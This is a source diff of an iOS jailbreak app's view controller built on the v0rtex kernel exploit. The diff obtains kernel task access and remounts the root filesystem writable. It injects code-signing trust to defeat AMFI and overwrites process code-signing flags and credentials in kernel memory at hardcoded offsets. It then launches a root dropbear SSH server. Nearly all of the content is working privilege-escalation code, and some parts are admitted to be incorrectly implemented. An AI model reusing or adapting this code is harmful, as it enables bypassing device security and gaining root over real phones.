@@ -32,6 +32,7 @@
 task_t tfp0;
 kptr_t kslide;
 kptr_t kern_ucred;
+kptr_t self_proc;
 
 - (void)viewDidLoad {
     [super viewDidLoad];
@@ -59,8 +60,9 @@ kptr_t kern_ucred;
     tfp0 = MACH_PORT_NULL;
     kslide = 0;
     kern_ucred = 0;
+    self_proc = 0;
     
-    kern_return_t ret = v0rtex(&tfp0, &kslide, &kern_ucred);
+    kern_return_t ret = v0rtex(&tfp0, &kslide, &kern_ucred, &self_proc);
     
     if (ret != KERN_SUCCESS) {
         [self writeText:@"ERROR: exploit failed"];
@@ -69,22 +71,22 @@ kptr_t kern_ucred;
     
     [self writeText:@"exploit succeeded!"];
     
-    printf("got val for kern_ucred = %llu \n", kern_ucred);
+    printf("got val for self_proc = 0x%llx \n", self_proc);
+    printf("got val for kern_ucred = 0x%llx \n", kern_ucred);
     
     {
         // set up stuff
-        int patch_init = init_patchfinder(tfp0, kslide + 0xFFFFFFF007004000, NULL);
-        printf("init_patchfinder = %d \n", patch_init);
-        
+        init_patchfinder(tfp0, kslide + 0xFFFFFFF007004000, NULL);
         init_amfi(tfp0);
+        init_kernel(tfp0);
     }
     
     {
         // Remount '/' as r/w
-        int remountOutput = mount_root(tfp0, kslide);
-        LOG("remount: %d", remountOutput);
-        if (remountOutput != 0) {
-            [self writeText:@"ERROR: failed to remount '/' as r/w"];
+        int remount = mount_root(tfp0, kslide);
+        LOG("remount: %d", remount);
+        if (remount != 0) {
+            [self writeText:[NSString stringWithFormat:@"ERROR: failed to remount '/' as r/w (%d)", remount]];
             return;
         }
         [self writeText:@"remounted '/' as r/w"];
@@ -97,68 +99,43 @@ kptr_t kern_ucred;
         LOG("has root access: %s", rootAccess ? "yes" : "no");
     }
     
-    // get kern proc
-    /*
-    uint64_t kern_proc = 0;
-    uint64_t proc = rk64(tfp0, find_allproc());
-    while (proc) {
-        uint32_t pid = (uint32_t)rk32(tfp0, proc + 0x10);
-        char name[40] = {0};
-        printf("name: %s \n", name);
+    {
+        // create v0rtex dirs
+        mkdir("/v0rtex", 0777);
+        mkdir("/v0rtex/bins", 0777);
+        mkdir("/v0rtex/logs", 0777);
         
-        if (pid == 0) {
-            kern_proc = proc;
-        }
-        proc = rk64(tfp0, proc);
     }
     
-    printf("found kern_proc at: 0x%016llx \n", kern_proc);
-    
-    // get kern creds
-    uint64_t kern_ucred = rk64(tfp0, kern_proc + 0x100);
-    printf("found kern_ucred at: 0x%016llx \n", kern_ucred);
-    */
-    
-    // create v0rtex dir and init filemanager n bundlepath
-    mkdir("/v0rtex", 0777);
+    // init filemanager n bundlepath
     NSFileManager *fileMgr = [NSFileManager defaultManager];
     NSString *bundlePath = [NSString stringWithFormat:@"%s", bundle_path()];
     
     {
-        // remove old files under '/v0rtex'
-        [fileMgr removeItemAtPath:@"/v0rtex/launchctl" error:nil];
+        // remove old files
+        NSLog(@"removing old files...");
+        [fileMgr removeItemAtPath:@"/v0rtex/bins" error:nil];
+        [fileMgr removeItemAtPath:@"/v0rtex/bootstrap.tar" error:nil];
+        [fileMgr removeItemAtPath:@"/v0rtex/bootstrap2.tar" error:nil];
         [fileMgr removeItemAtPath:@"/v0rtex/dropbear" error:nil];
-        [fileMgr removeItemAtPath:@"/v0rtex/dropbear.plist" error:nil];
-        [fileMgr removeItemAtPath:@"/v0rtex/ls" error:nil];
-        [fileMgr removeItemAtPath:@"/v0rtex/test_fsigned" error:nil];
+        [fileMgr removeItemAtPath:@"/v0rtex/start.sh" error:nil];
         [fileMgr removeItemAtPath:@"/v0rtex/tar" error:nil];
         [fileMgr removeItemAtPath:@"/bin/sh" error:nil];
-        [fileMgr removeItemAtPath:@"/bin/bash" error:nil];
         
         // copy in all our bins
-        NSLog(@"copying in bins...");
-        [fileMgr copyItemAtPath:[bundlePath stringByAppendingString:@"/launchctl"]
-                         toPath:@"/v0rtex/launchctl" error:nil];
+        NSLog(@"copying bins...");
+        [fileMgr copyItemAtPath:[bundlePath stringByAppendingString:@"/bootstrap.tar"]
+                         toPath:@"/v0rtex/bootstrap.tar" error: nil];
         [fileMgr copyItemAtPath:[bundlePath stringByAppendingString:@"/dropbear"]
                          toPath:@"/v0rtex/dropbear" error:nil];
-        [fileMgr copyItemAtPath:[bundlePath stringByAppendingString:@"/dropbear.plist"]
-                         toPath:@"/v0rtex/dropbear.plist" error:nil];
-        [fileMgr copyItemAtPath:[bundlePath stringByAppendingString:@"/ls"]
-                         toPath:@"/v0rtex/ls" error:nil];
         [fileMgr copyItemAtPath:[bundlePath stringByAppendingString:@"/tar"]
                          toPath:@"/v0rtex/tar" error:nil];
         [fileMgr copyItemAtPath:[bundlePath stringByAppendingString:@"/bash"]
-                         toPath:@"/bin/bash" error:nil];
-        [fileMgr linkItemAtPath:@"/bin/sh"
-                         toPath:@"/bin/bash" error:nil];
-        NSLog(@"done copying bins.");
+                         toPath:@"/bin/sh" error:nil];
         
         // make sure all our bins have perms
         chmod("/v0rtex/dropbear", 0777);
-        chmod("/v0rtex/launchctl", 0777);
-        chmod("/v0rtex/ls", 0777);
         chmod("/v0rtex/tar", 0777);
-        chmod("/bin/bash", 0777);
         chmod("/bin/sh", 0777);
         
         // create dir's and files for dropbear
@@ -171,19 +148,27 @@ kptr_t kern_ucred;
     }
     
     {
-        // fuck amfi
-        // trust_files("/bin");
-        inject_trust("/bin/bash");
-        inject_trust("/v0rtex/launchctl");
+        // fuck up amfi
+        inject_trust("/bin/sh");
         inject_trust("/v0rtex/dropbear");
         inject_trust("/v0rtex/tar");
     }
     
-    execprog(0, "/v0rtex/tar", NULL);
+    {
+        // extract bootstrap.tar
+        execprog(0, "/v0rtex/tar", (const char **)&(const char*[]){ "/v0rtex/tar", "-xf", "/v0rtex/bootstrap.tar", "-C", "/v0rtex", NULL });
+        
+        // sign all the binaries
+        trust_files("/v0rtex/bins");
+    }
     
-    // Launch dropbear
-    execprog(0, "/v0rtex/dropbear", (const char **)&(const char*[]){ "/v0rtex/dropbear", "-R", "-E", "-m", "-F", NULL });
-    // execprog(kern_ucred, "/v0rtex/launchctl", (const char**)&(const char*[]){ "/v0rtex/launchctl", "load", "/v0rtex/dropbear.plist", NULL });
+    {
+        // Launch dropbear
+        NSLog(@"MAKE SURE TO FIRST RUN 'export PATH=$PATH:/v0rtex/bins' WHEN FIRST CONNECTING TO SSH");
+        execprog(kern_ucred, "/v0rtex/dropbear", (const char**)&(const char*[]){
+            "/v0rtex/dropbear", "-R", "-E", "-m", "-F", "-S", "/", NULL
+        });
+    }
     
     // Done.
     [self writeText:@"\n done."];
@@ -199,7 +184,7 @@ int execprog(uint64_t kern_ucred, const char *prog, const char* args[]) {
         args = (const char **)&(const char*[]){ prog, NULL };
     }
     
-    const char *logfile = [NSString stringWithFormat:@"/tmp/%@-%lu",
+    const char *logfile = [NSString stringWithFormat:@"/v0rtex/logs/%@-%lu",
                            [[NSMutableString stringWithUTF8String:prog] stringByReplacingOccurrencesOfString:@"/" withString:@"_"],
                            time(NULL)].UTF8String;
     printf("Spawning [ ");
@@ -230,6 +215,8 @@ int execprog(uint64_t kern_ucred, const char *prog, const char* args[]) {
         return rv;
     }
     
+    printf("process spawned with pid %d \n", pd);
+    
     #define CS_GET_TASK_ALLOW       0x0000004    /* has get-task-allow entitlement */
     #define CS_INSTALLER            0x0000008    /* has installer entitlement      */
     #define CS_HARD                 0x0000100    /* don't load invalid pages       */
@@ -245,27 +232,25 @@ int execprog(uint64_t kern_ucred, const char *prog, const char* args[]) {
     // find_allproc will crash, currently
     // please fix
     if (kern_ucred != 0) {
-        printf("kern ucred is not 0 = %llu", kern_ucred);
         int tries = 3;
         while (tries-- > 0) {
             sleep(1);
-            uint64_t proc = rk64(tfp0, find_allproc());
+            uint64_t proc = rk64(kslide + 0xFFFFFFF0075E66F0);
             while (proc) {
-                uint32_t pid = rk32(tfp0, proc + 0x10);
+                uint32_t pid = rk32(proc + 0x10);
                 if (pid == pd) {
-                    uint32_t csflags = rk32(tfp0, proc + 0x2a8);
+                    uint32_t csflags = rk32(proc + 0x2a8);
                     csflags = (csflags | CS_PLATFORM_BINARY | CS_INSTALLER | CS_GET_TASK_ALLOW) & ~(CS_RESTRICT  | CS_HARD);
-                    wk32(tfp0, proc + 0x2a8, csflags);
-                    printf("empower\n");
+                    wk32(proc + 0x2a8, csflags);
                     tries = 0;
 
-                    uint64_t self_ucred = rk32(tfp0, proc + 0x100);
-
-                    uint32_t selfcred_temp = rk32(tfp0, kern_ucred + 0x78);
-                    wk32(tfp0, self_ucred + 0x78, selfcred_temp);
+                    // i don't think this bit is implemented properly
+                    uint64_t self_ucred = rk64(proc + 0x100);
+                    uint32_t selfcred_temp = rk32(kern_ucred + 0x78);
+                    wk32(self_ucred + 0x78, selfcred_temp);
 
                     for (int i = 0; i < 12; i++) {
-                        wk32(tfp0, self_ucred + 0x18 + (i * sizeof(uint32_t)), 0);
+                        wk32(self_ucred + 0x18 + (i * sizeof(uint32_t)), 0);
                     }
 
                     printf("gave elevated perms to pid %d \n", pid);
@@ -276,7 +261,7 @@ int execprog(uint64_t kern_ucred, const char *prog, const char* args[]) {
                     // kcall(find_bzero(), 2, self_ucred + 0x18, 12);
                     break;
                 }
-                proc = rk64(tfp0, proc);
+                proc = rk64(proc);
             }
         }
     }
@@ -303,6 +288,87 @@ int execprog(uint64_t kern_ucred, const char *prog, const char* args[]) {
     remove(logfile);
     
     return 0;
+}
+
+int execprog_clean(uint64_t kern_ucred, const char *prog, const char* args[]) {
+    if (args == NULL) {
+        args = (const char **)&(const char*[]){ prog, NULL };
+    }
+    
+    int rv;
+    pid_t pd;
+    if ((rv = posix_spawn(&pd, prog, NULL, NULL, (char**)args, NULL))) {
+        printf("posix_spawn error: %d (%s)\n", rv, strerror(rv));
+        return rv;
+    }
+    
+    #define CS_GET_TASK_ALLOW       0x0000004    /* has get-task-allow entitlement */
+    #define CS_INSTALLER            0x0000008    /* has installer entitlement      */
+    #define CS_HARD                 0x0000100    /* don't load invalid pages       */
+    #define CS_RESTRICT             0x0000800    /* tell dyld to treat restricted  */
+    #define CS_PLATFORM_BINARY      0x4000000    /* this is a platform binary      */
+    
+    /*
+     1. read 8 bytes from proc+0x100 into self_ucred
+     2. read 8 bytes from kern_ucred + 0x78 and write them to self_ucred + 0x78
+     3. write 12 zeros to self_ucred + 0x18
+     */
+    
+    if (kern_ucred != 0) {
+        int tries = 3;
+        while (tries-- > 0) {
+            sleep(1);
+            // this needs to be moved to an offset VVVVVVVVVVVVV
+            uint64_t proc = rk64(kslide + 0xFFFFFFF0075E66F0);
+            while (proc) {
+                uint32_t pid = rk32(proc + 0x10);
+                if (pid == pd) {
+                    uint32_t csflags = rk32(proc + 0x2a8);
+                    csflags = (csflags | CS_PLATFORM_BINARY | CS_INSTALLER | CS_GET_TASK_ALLOW) & ~(CS_RESTRICT  | CS_HARD);
+                    wk32(proc + 0x2a8, csflags);
+                    tries = 0;
+                    
+                    // i don't think this bit is implemented properly
+                    uint64_t self_ucred = rk64(proc + 0x100);
+                    uint32_t selfcred_temp = rk32(kern_ucred + 0x78);
+                    wk32(self_ucred + 0x78, selfcred_temp);
+                    
+                    for (int i = 0; i < 12; i++) {
+                        wk32(self_ucred + 0x18 + (i * sizeof(uint32_t)), 0);
+                    }
+                    
+                    // original stuff, rewritten above using v0rtex stuff
+                    // kcall(find_copyout(), 3, proc+0x100, &self_ucred, sizeof(self_ucred));
+                    // kcall(find_bcopy(), 3, kern_ucred + 0x78, self_ucred + 0x78, sizeof(uint64_t));
+                    // kcall(find_bzero(), 2, self_ucred + 0x18, 12);
+                    break;
+                }
+                proc = rk64(proc);
+            }
+        }
+    }
+    
+    int status;
+    waitpid(pd, &status, 0);
+    return status;
+}
+
+void read_file(const char *path) {
+    char buf[65] = {0};
+    int fd = open(path, O_RDONLY);
+    if (fd == -1) {
+        perror("open path");
+        return;
+    }
+    
+    printf("contents of %s: \n ------------------------- \n", path);
+    while(read(fd, buf, sizeof(buf) - 1) == sizeof(buf) - 1) {
+        printf("%s", buf);
+    }
+    printf("%s", buf);
+    printf("\n-------------------------\n");
+    
+    close(fd);
 }
 
 bool can_write_root() {
